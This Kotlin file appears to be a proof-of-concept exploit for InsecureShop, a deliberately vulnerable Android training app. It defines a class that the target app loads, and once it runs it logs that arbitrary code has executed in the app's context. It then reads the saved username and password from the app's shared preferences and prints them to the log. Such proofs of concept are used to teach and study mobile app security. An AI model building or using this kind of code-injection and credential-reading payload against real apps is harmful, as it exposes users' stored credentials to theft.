package com.insecureshopapp

import android.content.Context
import android.util.Log

class MainInterface {
    companion object {
        @JvmStatic
        fun getInstance(context: Context): Any {
            Log.d("exploit", "✓ Codice arbitrario eseguito nel contesto: ${context.packageName}")

            try {
                val prefs = context.getSharedPreferences("Prefs", Context.MODE_PRIVATE)
                val username = prefs.getString("username", "N/A")
                val password = prefs.getString("password", "N/A")
                Log.d("exploit", "Username: $username - Password: $password")
            } catch (e: Exception) {
                Log.e("exploit", "Errore nell'accesso a SharedPreferences", e)
            }

            return MainInterface()
        }
    }
}
